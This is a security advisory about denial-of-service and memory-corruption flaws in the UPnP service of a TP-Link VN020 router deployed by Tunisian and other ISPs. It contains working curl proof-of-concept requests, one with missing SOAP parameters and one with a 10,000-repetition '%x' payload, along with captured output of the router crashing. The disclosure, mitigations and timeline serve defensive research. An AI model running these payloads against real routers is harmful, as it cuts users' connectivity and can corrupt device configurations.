# UPnP WANIPConnection1 DoS and Memory Corruption Vulnerabilities

## Overview
Two critical vulnerabilities have been identified in the UPnP implementation of TP-Link VN020-F3v(T) router model, specifically affecting the routers deployed by Tunisie Telecom and Topnet and other variants in Algeria and Morocco. These vulnerabilities allow unauthenticated attackers to disrupt network operations and potentially cause memory corruption on the affected routers through a single malformed SOAP request over UPnP. The vulnerabilities are present in firmware version TT_V6.2.1021 running UPnP/1.0 BLR-TX4S/1.0, and can be launched on the local network only, for most ISPs.

## Vulnerability Overview

| CVE ID         | Vulnerability Type   | Description                                                                 |
|----------------|----------------------|-----------------------------------------------------------------------------|
| CVE-2024-12342 | Denial of Service    | This vulnerability allows attackers to cause a denial of service by sending malformed SOAP requests, disrupting network operations. |
| CVE-2024-12343 | Buffer Overflow      | This vulnerability enables attackers to cause memory corruption through oversized or malformed input, potentially leading to arbitrary code execution if exploited correctly. |


### Valid Request & Response
```bash
curl -v -X POST "http://192.168.1.1:5431/control/WANIPConnection" \
-H "Content-Type: text/xml" \
-H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" \
-d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>80</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>80</NewInternalPort>
      <NewInternalClient>192.168.1.100</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>NormalPayload</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>'
```

### Expected Response
```xml
* Trying 192.168.1.1:5431...
* Connected to 192.168.1.1 (192.168.1.1) port 5431
> POST /control/WANIPConnection HTTP/1.1
> Host: 192.168.1.1:5431
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Type: text/xml
> SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
> Content-Length: 602
>
* upload completely sent off: 602 bytes
< HTTP/1.1 200 OK
< Content-Type: text/xml; charset="utf-8"
< Connection: close
< Content-Length: 298
< Server: UPnP/1.0 BLR-TX4S/1.0
< Ext:
<
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>    <u:AddPortMappingResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
    </u:AddPortMappingResponse>
* Closing connection
</s:Body></s:Envelope>
```


## 1) Malformed Command Analysis (Missing Paramaters)
```bash
curl -v -X POST "http://192.168.1.1:5431/control/WANIPConnection" \
-H "Content-Type: text/xml" \
-H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" \
-d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body><u:AddPortMapping>
<NewPortMappingDescription>hello</NewPortMappingDescription>
</u:AddPortMapping></s:Body></s:Envelope>'
```

#### Command Breakdown
1. **Request Components**
   - **Method**: POST
   - **Port**: 5431
   - **Endpoint**: /control/WANIPConnection
   - **Headers**:
     - Content-Type: text/xml
     - SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping

2. **Malformed XML Analysis**
   - Missing required namespace declarations
   - Incomplete AddPortMapping parameters:
     - No NewRemoteHost
     - No NewExternalPort
     - No NewProtocol
     - No NewInternalPort
     - No NewInternalClient
     - No NewEnabled
     - No NewLeaseDuration
     - Only includes NewPortMappingDescription (optional parameter)
4. **What's happening here?**:
     - Router attempts to process incomplete SOAP structure
     - Missing required fields likely trigger improper error handling
     - Results in service crash rather than graceful error response 

3. **Error Response**
```bash
*   Trying 192.168.1.1:5431...
* Connected to 192.168.1.1 (192.168.1.1) port 5431
> POST /control/WANIPConnection HTTP/1.1
> Host: 192.168.1.1:5431
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Type: text/xml
> SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
> Content-Length: 216
>
* upload completely sent off: 216 bytes
 [Router will crash and this stay frozen here]
```

### Video Demonstration of this command:
https://github.com/user-attachments/assets/44988079-0d8c-4e5d-b09d-8856edaaf34a


### 2) Malformed Command Analysis (Potential Buffer Overflow and Memory Corruption)
#### Vulnerable Command & Behavior
```bash
curl -v -X POST "http://192.168.1.1:5431/control/WANIPConnection" \
     -H "Content-Type: text/xml" \
     -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType\"" \
     -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetConnectionType xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewConnectionType>'"$(perl -e 'print "%x" x 10000;')"'</NewConnectionType>
    </u:SetConnectionType>
  </s:Body>
</s:Envelope>'
```

#### Command Breakdown

1. **Request Components**

   - **Method:** POST
   - **Port:** 5431
   - **Endpoint:** `/control/WANIPConnection`
   - **Headers:**
     - `Content-Type: text/xml`
     - `SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType"`
   - **Payload:**
     - **Injected Payload:** `"%x" x 10000` generates a string of 10,000 `%x` repetitions within the `<NewConnectionType>` tag.

2. **Payload Analysis**
   - **Injected Content:** `"%x%x%x%x...%x"` (10,000 times)
   - **Purpose:** To flood the `<NewConnectionType>` field with an excessively large and repetitive string, to attempt to exceed buffer limits.

### Observed Behavior

#### We send a valid request to test the SOAP structure:

```bash
curl -v -X POST "http://192.168.1.1:5431/control/WANIPConnection" \
     -H "Content-Type: text/xml" \
     -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType\"" \
     -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetConnectionType xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewConnectionType>'"$(perl -e 'print "%x" x 10;')"'</NewConnectionType>
    </u:SetConnectionType>
  </s:Body>
</s:Envelope>'
```

### Response:

```bash
*   Trying 192.168.1.1:5431...
* Connected to 192.168.1.1 (192.168.1.1) port 5431
> POST /control/WANIPConnection HTTP/1.1
> Host: 192.168.1.1:5431
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Type: text/xml
> SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType"
> Content-Length: 299
>
* upload completely sent off: 299 bytes
< HTTP/1.1 200 OK
< Content-Type: text/xml; charset="utf-8"
< Connection: close
< Content-Length: 304
< Server: UPnP/1.0 BLR-TX4S/1.0
< Ext:
<
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>    <u:SetConnectionTypeResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
    </u:SetConnectionTypeResponse>
* Closing connection
</s:Body></s:Envelope>
```

#### We send the malformed request now:

```bash
curl -v -X POST "http://192.168.1.1:5431/control/WANIPConnection" \
     -H "Content-Type: text/xml" \
     -H "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType\"" \
     -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetConnectionType xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewConnectionType>'"$(perl -e 'print "%x" x 10000;')"'</NewConnectionType>
    </u:SetConnectionType>
  </s:Body>
</s:Envelope>'
```

#### Response
```bash
*   Trying 192.168.1.1:5431...
* Connected to 192.168.1.1 (192.168.1.1) port 5431
> POST /control/WANIPConnection HTTP/1.1
> Host: 192.168.1.1:5431
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Type: text/xml
> SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType"
> Content-Length: 20279
>
* upload completely sent off: 20279 bytes

(Completely frozen here router crash)
```
### Video demonstration: 


https://github.com/user-attachments/assets/d3eb3337-5ebd-46ed-8dbc-a20742b86c43


#### Evidence of Buffer Overflow and Memory Corruption

- **Normal Operation:**

  - **Payload:** `"%x" x 10`
  - **Behavior:** Receives `200 OK`, router remains operational.
  - **Implication:** UPnP service handles small, well-formed inputs correctly.

- **Crash with Large Payload:**
  - **Payload:** `"%x" x 10000`
  - **Behavior:** Router crashes and becomes unresponsive.
  - **Implication:** indications of potential buffer overflow or memory corruption due to lack of input validation and handling of excessively large inputs which can allow for RCE.

### Persistent effects:
- After testing these payloads for a while I noticed that at some point the router will restart it self and stay in a state where there's no internet connectivity which is most likely a result of a configuration corruption somewhere due to unsafe restarts, to fix this the config had to be reset.
<img src="https://github.com/user-attachments/assets/41f2cfb5-0575-474f-9873-9e3e033197c3" alt="Description" width="500"/>

- Another effect i noticed while testing the 2nd command is that in some cases the router will stay frozen and will not restart requring manual intervention.

## Remediation
### Temporary Mitigations
1. Disable UPnP service if not required
2. Block external access to port 5431
3. Implement network-based filtering of UPnP requests

## Timeline
- Discovery Date: 10/22/2024
- Reported to Vendor: 11/15/2024
- Reported to CNA: 11/17/2024
- CVE Assignment: CVE-2024-12342 & CVE-2024-12343
  

## Author
**Mohamed Maatallah**
- GitHub: [@Zephkek](https://github.com/Zephkek)
- Affiliation: Independent Security Researcher
